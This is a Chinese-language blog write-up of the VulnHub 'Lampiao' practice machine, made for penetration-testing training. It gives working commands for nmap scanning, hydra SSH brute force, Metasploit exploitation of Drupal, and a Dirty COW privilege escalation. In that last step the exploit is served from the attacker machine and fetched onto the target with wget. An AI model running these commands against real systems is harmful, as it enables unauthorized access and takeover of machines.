---
title: 靶场练习-Lampiao
tags:
  - 信息安全
readmore: true
date: 2023-02-23 13:07:58
---

### 环境搭建

访问官网：https://www.vulnhub.com/entry/lampiao-1,249/

页面向下滑找到 Download 下载靶场；下载成功后，启动虚拟机，单击“打开”选项，找到刚刚下载并解压好的靶场文件，等待导入完成；

完成后启动靶机，可以看到只有一个登录窗口，此时靶机已经成功运行。

启动 kali 虚拟机，并同时设置两个机器的网络配置为 NAT 模式；

这样可以使所有的虚拟机共同处在一个独立的网段（和物理机不在同一个网段），方便后续探索靶机 ip 时更快的找到靶机 ip；

<!-- more -->

### 获取 shell

由于靶机无法直接登录，所以我们也无法获取靶机的任何信息，最重要的就是要先访问靶机；

#### nmap 扫描

nmap： nmap（Network Mapper）是一款开源免费的针对大型网络的端口扫描工具，nmap可以检测目标主机是否在线、主机端口开放情况、检测主机运行的服务类型及版本信息、检测操作系统与设备类型等信息。

官方网站：https://nmap.org/

使用 nmap 扫描整个网段，找到靶机的 ip 地址：

```bash
nmap -sS -Pn 192.168.19.0/24
# -sS 半开放扫描，打开一个不完全的 TCP 连接，速度较快且不容易被发现
# -Pn 穿透防火墙进行扫描，有的防火墙禁止 ping 命令，可以使用此选项
# 要扫描的网段，24指的是32位二进制的前24位用 “1” 表示，并变化后面的几位来进行扫描
```

 ![](https://pic.mewhz.com/lampiao/1.png)

发现这个 ip 的 80 端口是开放的，去访问这个网站，发现是一个静态页面；

进一步扫描 ip 开放的所有端口：

```bash
nmap -T4 -p 1-65535 192.168.19.136
# -T4 设置扫描的时间模板为 T4， 可以更快的扫描
# -p 设置扫描的端口范围，1-65535 是所有的端口
```

 ![](https://pic.mewhz.com/lampiao/2.png)

发现开启着 ssh 服务(22端口)，80 端口和 1898 端口，尝试访问 1898端口。

#### 爆破用户名密码 (第一种获取 shell 方法)

访问 1898 端口后，尝试都点击一下，在 url node = 1 中尝试修改为 2 并访问:

```bash
http://192.168.19.136:1898/?q=node/2
```

 ![](https://pic.mewhz.com/lampiao/3.png)

发现一个 m4a 和 png 文件，扫描二维码发现没有有用的信息，听 m4a 文件可以得到用户名为

>tiago

得到了用户名，可以尝试使用 cewl 制作字典来进行爆破:

```bash
cewl http://192.168.19.136:1898/?q=node/1 -w password.txt
# cewl 可以探索网站的内容并生成一个字典文件
# -w 结果写入文件
```

 ![](https://pic.mewhz.com/lampiao/4.png)

使用 hydra 工具：

```bash
hydra -l tiago -P password.txt 192.168.19.136 ssh
# -l: 指定用户名进行爆破
# -P 用于指定密码字典 (大写)
# ssh: 指定服务名，支持的服务跟协议有：telnet，ftp，pop3等等。
```

成功得到用户名密码：username: **tiago**   password: **Virgulino**

![](https://pic.mewhz.com/lampiao/5.png)

使用 ssh 命令成功登录：

```bash
ssh tiago@192.168.19.136
```

![](https://pic.mewhz.com/lampiao/6.png)

#### 漏洞利用 (第二种获取 shell 方法)

进入网站后，先使用 dirsearch 命令扫描一下目录：

```bash
dirsearch -u 192.168.19.136:1898
```

![](https://pic.mewhz.com/lampiao/7.png)

发现 CHANGELOG.txt 文件，并通过该文件得到了 Drupal 的版本，百度搜索发现该版本存在漏洞，使用 msfconsole 利用漏洞；

msfconsole：集成了很多漏洞的利用的脚本，并且使用起来很简单的网络安全工具

```bash
msfconsole
# 如果启动很慢，可以在 kali 中直接启动 metasploit framework
search Drupal
# 启动后输入该命令搜索 Drupal 相关漏洞
```

![](https://pic.mewhz.com/lampiao/8.png)

找到对应的漏洞

```bash
use 1
# 使用攻击模块 1
set rhosts 192.168.19.136
# 设置目标 ip
set rport 1898
# 设置目标端口
show options
# 查看信息是否正确
run
# 运行攻击模块
```

成功拿到对应的 shell

![](https://pic.mewhz.com/lampiao/9.png)

执行shell获取交互式命令，由于我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用 python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：

```python
shell
# shell 获取目标主机的远程命令行shell，使用exit退出当前的shell
python -c 'import pty;  pty.spawn("/bin/bash")'
# -c 可以在命令行调用 python 代码
# pty 伪终端工具
# pty.spawn 生成一个进程，并将其控制终端连接到当前进程的标准 io。
```

![](https://pic.mewhz.com/lampiao/10.png)

### 提权

获取 shell 后发现是一个低权限的用户，所以我们需要提权。查看 linux 内核版本：

```bash
uname -r
# 用于显示操作系统的信息
# -r 显示操作系统的发行编号
```

![](https://pic.mewhz.com/lampiao/11.png)

发现该版本存在脏牛漏洞，可以使用脏牛(Dirty Cow)漏洞进行提权；

```bash
searchsploit dirty
# searchsploit 是一个用于Exploit-DB的命令行搜索工具
```

ExploitDB是一个面向全世界黑客的漏洞提交平台；https://www.exploit-db.com

![](https://pic.mewhz.com/lampiao/12.png)

使用 40847.cpp 作为提权的代码文件，首先在本机找到该文件

```bash
cd /usr/share/exploitdb/exploits/linux/local/
cp 40847.cpp /tmp
cd /tmp
```

然后将里面内容复制到靶机上，可以直接使用复制粘贴，也可以使用 xftp 或者 kali 使用 python 开启 web 服务，靶机通过 wget 命令进行下载。

```python
python -m http.server 8080
# 开启 8080 端口，kali 使用
wget 192.168.19.130:8080/40847.cpp
# 下载文件，文件保存在本地
```

下载后使用 g++ 进行编译

```bash
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 # g++ 是C&C++ 的编译器
 # -Wall 允许发出GCC能够提供的所有有用的警告
 # -pedantic 允许发出ANSI/ISO C标准所列出的所有警告
 # -O2 编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高
 # -std=c++11 就是用按C++2011标准来编译
 # -pthread 在Linux中要用到多线程时，需要链接pthread库
 # -o dcow gcc生成的目标文件,名字为dcow
 ./dcow 
 # 执行编译后的文件
```

获取到 root 用户密码：dirtyCowFun

```bash
su root
# 切换 root 用户，输入密码后成功登录
```

在 root 目录下成功找到 flag.txt

![](https://pic.mewhz.com/lampiao/13.png)

---

### 参考资料

[VulnHub-Lampiao 靶场渗透测试](https://www.cnblogs.com/l2sec/p/14403481.html)

[黑客工具之hydra详细使用教程](https://zhuanlan.zhihu.com/p/397779150)

[记一次lampiao靶机渗透](https://zhuanlan.zhihu.com/p/349079469)

[【工具使用】--- cewl](https://blog.csdn.net/qq_43168364/article/details/111773051)

[nmap 常用参数](https://blog.csdn.net/tryheart/article/details/108245986)

[msfconsole的使用 ](https://www.cnblogs.com/Junglezt/p/16009926.html)

[Python 3.10.0 官方文档(全)](https://www.bookstack.cn/books/python-3.10.0-zh)

[网络安全nmap扫描端口命令详解linux网络探测](https://www.920vip.net/article/66)
